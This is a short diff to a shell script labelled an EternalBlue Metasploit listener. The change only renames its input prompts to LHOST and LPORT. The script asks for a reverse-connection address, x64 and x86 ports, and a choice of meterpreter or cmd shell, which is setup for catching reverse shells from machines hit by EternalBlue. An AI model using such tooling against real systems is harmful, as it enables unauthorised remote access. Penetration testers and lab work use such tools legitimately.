@@ -7,11 +7,11 @@ cat << "EOF"
 EOF
 echo Enternal Blue Metasploit Listener
 echo
-echo IP for reverse connection:
+echo LHOST for reverse connection:
 read ip
-echo PORT for x64 reverse connection:
+echo LPORT for x64 reverse connection:
 read portOne
-echo PORT for x86 reverse connection:
+echo LPORT for x86 reverse connection:
 read portTwo
 echo Enter 0 for meterpreter shell or 1 for regular cmd shell:
 read cmd
